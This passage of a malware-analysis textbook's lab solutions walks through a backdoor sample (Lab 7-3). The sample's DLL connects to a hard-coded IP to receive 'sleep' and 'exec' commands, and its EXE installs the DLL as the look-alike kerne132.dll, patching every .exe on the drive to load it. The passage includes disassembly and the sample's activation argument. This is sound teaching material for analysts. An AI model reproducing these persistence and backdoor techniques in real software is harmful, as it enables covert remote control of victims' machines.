    the Navigate function, and we can use the Structures window in IDA Pro to create
    a structure and label the offset. When Navigate is called, Internet Explorer navigates
    to the web address *http://www.malwareanalysisbook*
  prefs: []
  type: TYPE_NORMAL
- en: '*.com/ad.html*.'
  prefs: []
  type: TYPE_NORMAL
- en: After the call to Navigate, there are a few cleanup functions and then the program
    ends. The program doesn’t install itself persistently, and it doesn’t modify the
    system. It simply displays a one-time advertisement.
  prefs: []
  type: TYPE_NORMAL
- en: When you encounter a simple program like this one, you should consider it suspect.
    It may come packaged with additional malware, of which this is just one component.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 7-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: This program achieves persistence by writing a DLL to *C:\Windows\* *System32*
    and modifying every *.exe* file on the system to import that DLL.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The program is hard-coded to use the filename *kerne**1**32.dll*, which makes
    a good signature. (Note the use of the number *1* instead of the letter *l*.)
    The program uses a hard-coded mutex named SADFHUHF.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The purpose of this program is to create a difficult-to-remove backdoor that
    connects to a remote host. The backdoor has two commands: one to execute a command
    and one to sleep.'
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: This program is very hard to remove because it infects every *.exe* file on
    the system. It’s probably best in this case to restore from backups.
  prefs: []
  type: TYPE_NORMAL
- en: If restoring from backups is particularly difficult, you could leave the malicious
    *kerne**1**32.dll* file and modify it to remove the malicious content.
  prefs: []
  type: TYPE_NORMAL
- en: Alternatively, you could copy *kernel32.dll* and name it *kerne**1**32.dll*,
    or write a program to undo all changes to the PE files.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**519**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: First, we’ll look at *Lab07-03.exe* using basic static analysis techniques.
    When we run Strings on the executable, we get the usual invalid strings and the
    imported functions. We also get days of the week, months of the year, and other
    strings that are part of the library code, not part of the malicious executable.
  prefs: []
  type: TYPE_NORMAL
- en: The following listing shows that the code has several interesting strings.
  prefs: []
  type: TYPE_NORMAL
- en: kerne132.dll
  prefs: []
  type: TYPE_NORMAL
- en: .exe
  prefs: []
  type: TYPE_NORMAL
- en: WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
  prefs: []
  type: TYPE_NORMAL
- en: C:\Windows\System32\Kernel32.dll
  prefs: []
  type: TYPE_NORMAL
- en: Lab07-03.dll
  prefs: []
  type: TYPE_NORMAL
- en: Kernel32\.
  prefs: []
  type: TYPE_NORMAL
- en: C:\windows\system32\kerne132.dll
  prefs: []
  type: TYPE_NORMAL
- en: C:\*
  prefs: []
  type: TYPE_NORMAL
- en: The string *kerne**1**32.dll* is clearly designed to look like *kernel32.dll*
    but replaces the *l* with a *1*.
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*For the remainder of this section, the imposter* **kerne132.dll** *will be
    in bold to make it* *easier to differentiate from* kernel32.dll *.*'
  prefs: []
  type: TYPE_NORMAL
- en: The string Lab07-03.dll tells us that the *.exe* may access the DLL for this
    lab in some way. The string WARNING_THIS_WILL_DESTROY_YOUR_MACHINE is interesting,
    but it’s actually an artifact of the modifications made to this malware for this
    book. Normal malware would not contain this string, and we’ll see more about its
    usage in the malware later.
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we examine the imports for *Lab07-03.exe*. The most interesting of these
    are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: CreateFileA
  prefs: []
  type: TYPE_NORMAL
- en: CreateFileMappingA
  prefs: []
  type: TYPE_NORMAL
- en: MapViewOfFile
  prefs: []
  type: TYPE_NORMAL
- en: IsBadReadPtr
  prefs: []
  type: TYPE_NORMAL
- en: UnmapViewOfFile
  prefs: []
  type: TYPE_NORMAL
- en: CloseHandle
  prefs: []
  type: TYPE_NORMAL
- en: FindFirstFileA
  prefs: []
  type: TYPE_NORMAL
- en: FindClose
  prefs: []
  type: TYPE_NORMAL
- en: FindNextFileA
  prefs: []
  type: TYPE_NORMAL
- en: CopyFileA
  prefs: []
  type: TYPE_NORMAL
- en: The imports CreateFileA, CreateFileMappingA, and MapViewOfFile tell us that
    this program probably opens a file and maps it into memory. The FindFirstFileA
    and FindNextFileA combination tells us that the program probably searches directories
    and uses CopyFileA to copy files that it finds.
  prefs: []
  type: TYPE_NORMAL
- en: The fact that the program does not import *Lab07-03.dll* (or use any of the
    functions from the DLL), LoadLibrary, or GetProcAddress suggests that it probably
    doesn’t load that DLL at runtime. This behavior is suspect and something we need
    to examine as part of our analysis.
  prefs: []
  type: TYPE_NORMAL
- en: '**520**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we check the DLL for any interesting strings and imports and find a few
    strings worth investigating, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: hello
  prefs: []
  type: TYPE_NORMAL
- en: 127.26.152.13
  prefs: []
  type: TYPE_NORMAL
- en: sleep
  prefs: []
  type: TYPE_NORMAL
- en: exec
  prefs: []
  type: TYPE_NORMAL
- en: The most interesting string is an IP address, 127.26.152.13, that the malware
    might connect to. (You can set up your network-based sensors to look for activity
    to this address.) We also see the strings hello, sleep, and exec, which we should
    examine when we open the program in IDA Pro.
  prefs: []
  type: TYPE_NORMAL
- en: Next, we check the imports for *Lab07-03.dll*. We see that the imports **7**
  prefs: []
  type: TYPE_NORMAL
- en: from *ws2_32.dll* contain all the functions necessary to send and receive data
    over a network. Also of note is the CreateProcess function, which tells us that
    this program may create another process.
  prefs: []
  type: TYPE_NORMAL
- en: We also check the exports for *Lab07-03.dll* and see, oddly, that it has none.
    Without any exports, it can’t be imported by another program, though a program
    could still call LoadLibrary on a DLL with no exports. We’ll keep this in mind
    when we look more closely at the DLL.
  prefs: []
  type: TYPE_NORMAL
- en: We next try basic dynamic analysis. When we run the executable, it exits quickly
    without much noticeable activity. (We could try to run the DLL using rundll32,
    but because the DLL has no exports, that won’t work.) Unfortunately, basic dynamic
    analysis doesn’t tell us much.
  prefs: []
  type: TYPE_NORMAL
- en: The next step is to perform analysis using IDA Pro. Whether you start with the
    DLL or EXE is a matter of preference. We’ll start with the DLL
  prefs: []
  type: TYPE_NORMAL
- en: because it’s simpler than the EXE.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analyzing the DLL**'
  prefs: []
  type: TYPE_NORMAL
- en: When looking at the DLL in IDA Pro, we see no exports, but we do see an entry
    point. We should navigate to DLLMain, which is automatically labeled by IDA Pro.
    Unlike the prior two labs, the DLL has a lot of code, and it would take a really
    long time to go through each instruction. Instead, we use a simple trick and look
    only at call instructions, ignoring all other instructions.
  prefs: []
  type: TYPE_NORMAL
- en: This can help you get a quick view of the DLL’s functionality. Let’s see what
    the code would look like with only the relevant call instructions.
  prefs: []
  type: TYPE_NORMAL
- en: 10001015 call __alloca_probe
  prefs: []
  type: TYPE_NORMAL
- en: 10001059 call ds:OpenMutexA
  prefs: []
  type: TYPE_NORMAL
- en: 1000106E call ds:CreateMutexA
  prefs: []
  type: TYPE_NORMAL
- en: 1000107E call ds:WSAStartup
  prefs: []
  type: TYPE_NORMAL
- en: 10001092 call ds:socket
  prefs: []
  type: TYPE_NORMAL
- en: 100010AF call ds:inet_addr
  prefs: []
  type: TYPE_NORMAL
- en: 100010BB call ds:htons
  prefs: []
  type: TYPE_NORMAL
- en: 100010CE call ds:connect
  prefs: []
  type: TYPE_NORMAL
- en: 10001101 call ds:send
  prefs: []
  type: TYPE_NORMAL
- en: 10001113 call ds:shutdown
  prefs: []
  type: TYPE_NORMAL
- en: 10001132 call ds:recv
  prefs: []
  type: TYPE_NORMAL
- en: 1000114B call ebp ; strncmp
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**521**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 10001159 call ds:Sleep
  prefs: []
  type: TYPE_NORMAL
- en: 10001170 call ebp ; strncmp
  prefs: []
  type: TYPE_NORMAL
- en: 100011AF call ebx ; CreateProcessA
  prefs: []
  type: TYPE_NORMAL
- en: 100011C5 call ds:Sleep
  prefs: []
  type: TYPE_NORMAL
- en: The first call is to the library function __alloca_probe to allocate stack on
    the space. All we can tell here is that this function uses a large stack. Following
    this are calls to OpenMutexA and CreateMutexA, which, like the malware in Lab
    7-1, are here to ensure that only one copy of the malware is running at one time.
  prefs: []
  type: TYPE_NORMAL
- en: The other listed functions are needed to establish a connection with a remote
    socket, and to transmit and receive data. This function ends with calls to Sleep
    and CreateProcessA. At this point, we don’t know what data is sent or received,
    or which process is being created, but we can guess at what this DLL does. The
    best explanation for a function that sends and receives data and creates processes
    is that it is designed to receive commands from a remote machine.
  prefs: []
  type: TYPE_NORMAL
- en: Now that we know what this function is doing, we need to see what data is being
    sent and received. First, we check the destination address of the connection.
    A few lines before the connect call, we see a call to inet_addr with the fixed
    IP address of 127.26.152.13\. We also see that the port argument is 0x50, which
    is port 80, the port normally used for web traffic.
  prefs: []
  type: TYPE_NORMAL
- en: But what data is being communicated? The call to send is shown in the following
    listing.
  prefs: []
  type: TYPE_NORMAL
- en: 100010F3 push 0 ; flags
  prefs: []
  type: TYPE_NORMAL
- en: 100010F5 repne scasb
  prefs: []
  type: TYPE_NORMAL
- en: 100010F7 not ecx
  prefs: []
  type: TYPE_NORMAL
- en: 100010F9 dec ecx
  prefs: []
  type: TYPE_NORMAL
- en: 100010FA push ecx ; len
  prefs: []
  type: TYPE_NORMAL
- en: 100010FB push offset buf ;
  prefs: []
  type: TYPE_NORMAL
- en: '"hello"'
  prefs: []
  type: TYPE_NORMAL
- en: 10001100 push esi ; s
  prefs: []
  type: TYPE_NORMAL
- en: 10001101 call ds:send
  prefs: []
  type: TYPE_NORMAL
- en: As you can see at , the buf argument stores the data to be sent over the network,
    and IDA Pro recognizes that the pointer to buf represents the string
  prefs: []
  type: TYPE_NORMAL
- en: '"hello" and labels it as such. This appears to be a greeting that the victim
    machine sends to let the server know that it’s ready for a command.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Next, we can see what data the program is expecting in response, as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 10001124 lea
  prefs: []
  type: TYPE_NORMAL
- en: eax, [esp+120Ch+buf]
  prefs: []
  type: TYPE_NORMAL
- en: 1000112B push 1000h ; len
  prefs: []
  type: TYPE_NORMAL
- en: 10001130 push eax ; buf
  prefs: []
  type: TYPE_NORMAL
- en: 10001131 push esi ; s
  prefs: []
  type: TYPE_NORMAL
- en: 10001132 call ds:recv
  prefs: []
  type: TYPE_NORMAL
- en: If we go to the call to recv , we see that the buffer on the stack has been
    labeled by IDA Pro at . Notice that the instruction that first accesses buf is
    an lea instruction at . The instruction doesn’t dereference the value stored
    **522**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: at that location, but instead only obtains a pointer to that location. The call
    to recv will store the incoming network traffic on the stack.
  prefs: []
  type: TYPE_NORMAL
- en: Now we must determine what the program is doing with the response.
  prefs: []
  type: TYPE_NORMAL
- en: We see the buffer value checked a few lines later at , as shown in the following
    listing.
  prefs: []
  type: TYPE_NORMAL
- en: 1000113C lea ecx, [esp+1208h+buf]
  prefs: []
  type: TYPE_NORMAL
- en: 10001143 push 5 ; size_t
  prefs: []
  type: TYPE_NORMAL
- en: 10001145 push ecx ; char *
  prefs: []
  type: TYPE_NORMAL
- en: 10001146 push offset aSleep ; "sleep"
  prefs: []
  type: TYPE_NORMAL
- en: 1000114B call ebp ; strncmp
  prefs: []
  type: TYPE_NORMAL
- en: 1000114D add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 10001150 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: '**7**'
  prefs: []
  type: TYPE_NORMAL
- en: 10001152 jnz short loc_10001161
  prefs: []
  type: TYPE_NORMAL
- en: 10001154 push 60000h ; dwMilliseconds
  prefs: []
  type: TYPE_NORMAL
- en: 10001159 call ds:Sleep
  prefs: []
  type: TYPE_NORMAL
- en: The buffer accessed at  is the same as the one from the previous listing, even
    though the offset from ESP is different (esp+1208+buf in one and esp+120C+buf
    in the other). The difference is due to the fact that the size of the stack has
    changed. IDA Pro labels both buf to make it easy to tell that they’re the same
    value.
  prefs: []
  type: TYPE_NORMAL
- en: This code calls strncmp at , and it checks to see if the first five characters
    are the string sleep. Then, immediately after the function call, it checks to
    see if the return value is 0 at ; if so, it calls the Sleep function to sleep
    for 60 seconds. This tells us that if the remote server sends the command sleep,
    the program will call the Sleep function.
  prefs: []
  type: TYPE_NORMAL
- en: 'We see the buffer accessed again a few instructions later, as follows: 10001161
    lea edx, [esp+1208h+buf]'
  prefs: []
  type: TYPE_NORMAL
- en: 10001168 push 4 ; size_t
  prefs: []
  type: TYPE_NORMAL
- en: 1000116A push edx ; char *
  prefs: []
  type: TYPE_NORMAL
- en: 1000116B push offset aExec ; "exec"
  prefs: []
  type: TYPE_NORMAL
- en: 10001170 call ebp ; strncmp
  prefs: []
  type: TYPE_NORMAL
- en: 10001172 add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 10001175 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 10001177 jnz short loc_100011B6
  prefs: []
  type: TYPE_NORMAL
- en: 10001179 mov ecx, 11h
  prefs: []
  type: TYPE_NORMAL
- en: 1000117E lea edi, [esp+1208h+StartupInfo]
  prefs: []
  type: TYPE_NORMAL
- en: 10001182 rep stosd
  prefs: []
  type: TYPE_NORMAL
- en: 10001184 lea eax, [esp+1208h+ProcessInformation]
  prefs: []
  type: TYPE_NORMAL
- en: 10001188 lea ecx, [esp+1208h+StartupInfo]
  prefs: []
  type: TYPE_NORMAL
- en: 1000118C push eax ; lpProcessInformation 1000118D push ecx ; lpStartupInfo
  prefs: []
  type: TYPE_NORMAL
- en: 1000118E push 0 ; lpCurrentDirectory
  prefs: []
  type: TYPE_NORMAL
- en: 10001190 push 0 ; lpEnvironment
  prefs: []
  type: TYPE_NORMAL
- en: 10001192 push 8000000h ; dwCreationFlags
  prefs: []
  type: TYPE_NORMAL
- en: 10001197 push 1 ; bInheritHandles
  prefs: []
  type: TYPE_NORMAL
- en: 10001199 push 0 ; lpThreadAttributes
  prefs: []
  type: TYPE_NORMAL
- en: 1000119B lea edx, [esp+1224h+CommandLine]
  prefs: []
  type: TYPE_NORMAL
- en: 100011A2 push 0 ; lpProcessAttributes 100011A4 push edx ; lpCommandLine
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**523**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 100011A5 push 0 ; lpApplicationName 100011A7 mov [esp+1230h+StartupInfo.cb],
    44h
  prefs: []
  type: TYPE_NORMAL
- en: 100011AF call ebx ; CreateProcessA
  prefs: []
  type: TYPE_NORMAL
- en: This time, we see that the code is checking to see if the buffer begins with
    exec. If so, the strncmp function will return 0, as shown at , and the code will
    fall through the jnz instruction at  and call the CreateProcessA function.
  prefs: []
  type: TYPE_NORMAL
- en: There are a lot of parameters to the CreateProcessA function shown at , but
    the most interesting is the CommandLine parameter at , which tells us the process
    that will be created. The listing suggests that the string in CommandLine was
    stored on the stack somewhere earlier in code, and we need to determine where.
    We search backward in our code to find CommandLine by placing the cursor on the
    CommandLine operator to highlight all instances within this function where the
    CommandLine value is accessed. Unfortunately, when you look through the whole
    function, you’ll see that the CommandLine pointer does not seem to be accessed
    or set elsewhere in the function.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we’re stuck. We see that CreateProcessA is called and that the
    program to be run is stored in CommandLine, but we don’t see CommandLine written
    anywhere. CommandLine must be written prior to being used as a parameter to CreateProcessA,
    so we still have some work to do.
  prefs: []
  type: TYPE_NORMAL
- en: This is a tricky case where IDA Pro’s automatic labeling has actually made it
    more difficult to identify where CommandLine was written. The IDA Pro function
    information shown in the following listing tells us that CommandLine corresponds
    to the value of 0x0FFB at .
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 ; BOOL __stdcall DllMain(...)
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 _DllMain@12 proc near
  prefs: []
  type: TYPE_NORMAL
- en: '10001010'
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 hObject = dword ptr -11F8h
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 name = sockaddr ptr -11F4h
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 ProcessInformation=_PROCESS_INFORMATION ptr -11E4h 10001010 StartupInfo
    = _STARTUPINFOA ptr -11D4h
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 WSAData = WSAData ptr -1190h
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 buf =  byte ptr -1000h
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 CommandLine =  byte ptr -0FFBh
  prefs: []
  type: TYPE_NORMAL
- en: 10001010 arg_4 = dword ptr 8
  prefs: []
  type: TYPE_NORMAL
- en: Remember our receive buffer started at 0x1000 , and that this value is set
    using the lea instruction, which tells us that the data itself is stored on the
    stack, and is not just a pointer to the data. Also, the fact that 0x0FFB is 5
    bytes into our receive buffer tells us that the command to be executed is whatever
    is stored 5 bytes into our receive buffer. In this case, that means that the data
    received from the remote server would be exec *FullPathOfProgramToRun*. When the
    malware receives the exec *FullPathOfProgramToRun* command string from the remote
    server, it will call CreateProcessA with *FullPathOfProgramToRun*.
  prefs: []
  type: TYPE_NORMAL
- en: This brings us to the end of this function and DLL. We now know that this DLL
    implements backdoor functionality that allows the attacker to launch an executable
    on the system by sending a response to a packet on **524**
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: port 80\. There’s still the mystery of why this DLL has no exported functions
    and how this DLL is run, and the content of the DLL offers no explanations, so
    we’ll need to defer those questions until later.
  prefs: []
  type: TYPE_NORMAL
- en: '**Analyzing the EXE**'
  prefs: []
  type: TYPE_NORMAL
- en: Next, we navigate to the main method in the executable. One of the first things
    we see is a check for the command-line arguments, as shown in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 00401440 mov eax, [esp+argc]
  prefs: []
  type: TYPE_NORMAL
- en: 00401444 sub esp, 44h
  prefs: []
  type: TYPE_NORMAL
- en: 00401447 cmp eax, 2
  prefs: []
  type: TYPE_NORMAL
- en: '**7**'
  prefs: []
  type: TYPE_NORMAL
- en: 0040144A push ebx
  prefs: []
  type: TYPE_NORMAL
- en: 0040144B push ebp
  prefs: []
  type: TYPE_NORMAL
- en: 0040144C push esi
  prefs: []
  type: TYPE_NORMAL
- en: 0040144D push edi
  prefs: []
  type: TYPE_NORMAL
- en: 0040144E jnz loc_401813
  prefs: []
  type: TYPE_NORMAL
- en: 00401454 mov eax, [esp+54h+argv]
  prefs: []
  type: TYPE_NORMAL
- en: 00401458 mov esi, offset aWarning_this_w ; "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE"
  prefs: []
  type: TYPE_NORMAL
- en: 0040145D mov eax, [eax+4]
  prefs: []
  type: TYPE_NORMAL
- en: '00401460 ; CODE XREF: _main+42 j 00401460 mov dl, [eax]'
  prefs: []
  type: TYPE_NORMAL
- en: 00401462 mov bl, [esi]
  prefs: []
  type: TYPE_NORMAL
- en: 00401464 mov cl, dl
  prefs: []
  type: TYPE_NORMAL
- en: 00401466 cmp dl, bl
  prefs: []
  type: TYPE_NORMAL
- en: 00401468 jnz short loc_401488
  prefs: []
  type: TYPE_NORMAL
- en: 0040146A test cl, cl
  prefs: []
  type: TYPE_NORMAL
- en: 0040146C jz short loc_401484
  prefs: []
  type: TYPE_NORMAL
- en: 0040146E mov dl, [eax+1]
  prefs: []
  type: TYPE_NORMAL
- en: 00401471 mov bl, [esi+1]
  prefs: []
  type: TYPE_NORMAL
- en: 00401474 mov cl, dl
  prefs: []
  type: TYPE_NORMAL
- en: 00401476 cmp dl, bl
  prefs: []
  type: TYPE_NORMAL
- en: 00401478 jnz short loc_401488
  prefs: []
  type: TYPE_NORMAL
- en: 0040147A add eax, 2
  prefs: []
  type: TYPE_NORMAL
- en: 0040147D add esi, 2
  prefs: []
  type: TYPE_NORMAL
- en: 00401480 test cl, cl
  prefs: []
  type: TYPE_NORMAL
- en: 00401482 jnz short loc_401460
  prefs: []
  type: TYPE_NORMAL
- en: '00401484 ; CODE XREF: _main+2C j 00401484 xor eax, eax'
  prefs: []
  type: TYPE_NORMAL
- en: 00401486 jmp short loc_40148D
  prefs: []
  type: TYPE_NORMAL
- en: The first comparison at  checks to see if the argument count is 2\. If the
    argument count is not 2, the code jumps at  to another section of code, which
    prematurely exits. (This is what happened when we tried to perform dynamic analysis
    and the program ended quickly.) The program then moves argv[1] into EAX at  and
    the "WARNING_THIS_WILL_DESTROY_YOUR_MACHINE" string into ESI. The loop between
     and  compares the values stored in ESI and EAX. If they are not the same, the
    program jumps to a location that will return from this function without doing
    anything else.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**525**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 'We’ve learned that this program exits immediately unless the correct parameters
    are specified on the command line. The correct usage of this program is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE
  prefs: []
  type: TYPE_NORMAL
- en: '**NOTE**'
  prefs: []
  type: TYPE_NORMAL
- en: '*Malware that has different behavior or requires command-line arguments is
    realistic,* *although this message is not. The arguments required by malware will
    normally be more* *cryptic. We chose to use this argument to ensure that you won’t
    accidentally run this on* *an important machine, because it can damage your computer
    and is difficult to remove.*'
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we could go back and redo our basic dynamic analysis and enter
    the correct parameters to get the program to execute more of its code, but to
    keep the momentum going, we’ll continue with the static analysis. If we get stuck,
    we can perform basic dynamic analysis.
  prefs: []
  type: TYPE_NORMAL
- en: Continuing in IDA Pro, we see calls to CreateFile, CreateFileMapping, and MapViewOfFile
    where it opens *kernel32.dll* and our DLL *Lab07-03.dll*. Looking through this
    function, we see a lot of complicated reads and writes to memory. We could carefully
    analyze every instruction, but that would take too long, so let’s try looking
    at the function calls first.
  prefs: []
  type: TYPE_NORMAL
- en: 'We see two other function calls: sub_401040 and sub_401070\. Each of these
    functions is relatively short, and neither calls any other function. The functions
    are comparing memory, calculating offsets, or writing to memory.'
  prefs: []
  type: TYPE_NORMAL
- en: Because we’re not trying to determine every last operation of the program, we
    can skip the tedious memory-operation functions. (Analyzing time-consuming functions
    like these is a common trap and should be avoided unless absolutely necessary.)
    We also see a lot of arithmetic, as well as memory movement and comparisons in
    this function, probably within the two open files ( *kernel32.dll* and *Lab07-03.dll*).
    The program is reading and writing the two open files. We could painstakingly
    track every instruction to see what changes are being made, but it’s much easier
    to skip over that for now and use dynamic analysis to observe how the files are
    accessed and modified.
  prefs: []
  type: TYPE_NORMAL
- en: Scrolling down in IDA Pro, we see more interesting code that calls Windows API
    functions. First, it calls CloseHandle on the two open files, so we know that
    the malware is finished editing those files. Then it calls CopyFile, which copies
    *Lab07-03.dll* and places it in *C:\Windows\System32\**kerne132.dll***, which
    is clearly meant to look like *kernel32.dll*. We can guess that ***kerne132.dll***
    will be used to run in place of *kernel32.dll*, but at this point, we don’t know
    how
  prefs: []
  type: TYPE_NORMAL
- en: '***kerne132.dll*** will be loaded.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The calls to CloseHandle and CopyFile tell us that this portion of code is
    complete, and the next section of code probably performs a separate logical task.
    We continue to look through the main method, and near the end, we see another
    function call that takes the string argument C:\\*, as follows: 00401806 push
    offset aC ; "C:\\*"'
  prefs: []
  type: TYPE_NORMAL
- en: 0040180B call sub_4011E0
  prefs: []
  type: TYPE_NORMAL
- en: '**526**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: Unlike the other functions called by main, sub_4011E0 calls several other imported
    functions and looks interesting. Navigating to sub_4011E0, we would expect to
    see that IDA Pro has named the first argument to the function as arg_0, but it
    has labeled it lpFilename instead. It knows that it is a filename, because it
    is used as a parameter to a Windows API function that accepts a filename as a
    parameter. One of the first things this function does is call FindFirstFile on
    C:\\* to search the *C:* drive.
  prefs: []
  type: TYPE_NORMAL
- en: Following the call to FindFirstFile, we see a lot of arithmetic and comparisons.
    This is another tedious and time-consuming function that we should skip and return
    to only if we need more information later. The first call we see (other than malloc)
    is to sub_4011e0, the function that we’re currently analyzing, which tells us
    that this is a recursive function that calls itself. The next **7**
  prefs: []
  type: TYPE_NORMAL
- en: 'function called is stricmp at , as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: 004013F6
  prefs: []
  type: TYPE_NORMAL
- en: call ds:_stricmp
  prefs: []
  type: TYPE_NORMAL
- en: 004013FC add esp, 0Ch
  prefs: []
  type: TYPE_NORMAL
- en: 004013FF test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00401401 jnz short loc_40140C
  prefs: []
  type: TYPE_NORMAL
- en: 00401403 push ebp ; lpFileName 00401404
  prefs: []
  type: TYPE_NORMAL
- en: call sub_4010A0
  prefs: []
  type: TYPE_NORMAL
- en: The arguments to the stricmp function are pushed onto the stack about 30 instructions
    before the function call, but you can still find them by looking for the most
    recent push instructions. The string comparison checks a string against .exe,
    and then it calls the function sub_4010a0 at  to see if they match.
  prefs: []
  type: TYPE_NORMAL
- en: We’ll finish reviewing this function before we see what sub_4010a0 does.
  prefs: []
  type: TYPE_NORMAL
- en: Digging further, we see a call to FindNextFileA, and then we see a jump call,
    which indicates that this functionality is performed in a loop. At the end of
    the function, FindClose is called, and then the function ends with some exception-handling
    code.
  prefs: []
  type: TYPE_NORMAL
- en: At this point, we can say with high confidence that this function is searching
    the *C:* drive for *.exe* files and doing something if a file has an *.exe* extension.
  prefs: []
  type: TYPE_NORMAL
- en: The recursive call tells us that it’s probably searching the whole filesystem.
  prefs: []
  type: TYPE_NORMAL
- en: We could go back and verify the details to be sure, but this would take a long
    time. A much better approach is to perform the basic dynamic analysis with Process
    Monitor (procmon) to verify that it’s searching every directory for files ending
    in *.exe*.
  prefs: []
  type: TYPE_NORMAL
- en: In order to see what this program is doing to *.exe* files, we need to analyze
    the function sub_4010a0, which is called when the *.exe* extension is found.
  prefs: []
  type: TYPE_NORMAL
- en: sub_4010a0 is a complex function that would take too long to analyze carefully.
  prefs: []
  type: TYPE_NORMAL
- en: Instead, we once again look only at the function calls. Here, we see that it
    first calls CreateFile, CreateFileMapping, and MapViewOfFile to map the entire
    file into memory. This tells us that the entire file is mapped into memory space,
    and the program can read or write the file without any additional function calls.
    This complicates analysis because it’s harder to tell how the file is being Solutions
    to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**527**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: modified. Again, we’ll just move quickly through this function and use dynamic
    analysis to see what changes are made to the file.
  prefs: []
  type: TYPE_NORMAL
- en: Continuing to review the function, we see more arithmetic calls to IsBadPtr,
    which verify that the pointer is valid. Then we see a call to stricmp as shown
    at  in the following listing.
  prefs: []
  type: TYPE_NORMAL
- en: 0040116E push offset aKernel32_dll ; "kernel32.dll"
  prefs: []
  type: TYPE_NORMAL
- en: 00401173 push ebx ; char *
  prefs: []
  type: TYPE_NORMAL
- en: 00401174 call ds:_stricmp
  prefs: []
  type: TYPE_NORMAL
- en: 0040117A add esp, 8
  prefs: []
  type: TYPE_NORMAL
- en: 0040117D test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040117F jnz short loc_4011A7
  prefs: []
  type: TYPE_NORMAL
- en: 00401181 mov edi, ebx
  prefs: []
  type: TYPE_NORMAL
- en: 00401183 or ecx, 0FFFFFFFFh
  prefs: []
  type: TYPE_NORMAL
- en: 00401186 repne scasb
  prefs: []
  type: TYPE_NORMAL
- en: 00401188 not ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040118A mov eax, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040118C mov esi, offset dword_403010
  prefs: []
  type: TYPE_NORMAL
- en: 00401191 mov edi, ebx
  prefs: []
  type: TYPE_NORMAL
- en: 00401193 shr ecx, 2
  prefs: []
  type: TYPE_NORMAL
- en: 00401196 rep movsd
  prefs: []
  type: TYPE_NORMAL
- en: 00401198 mov ecx, eax
  prefs: []
  type: TYPE_NORMAL
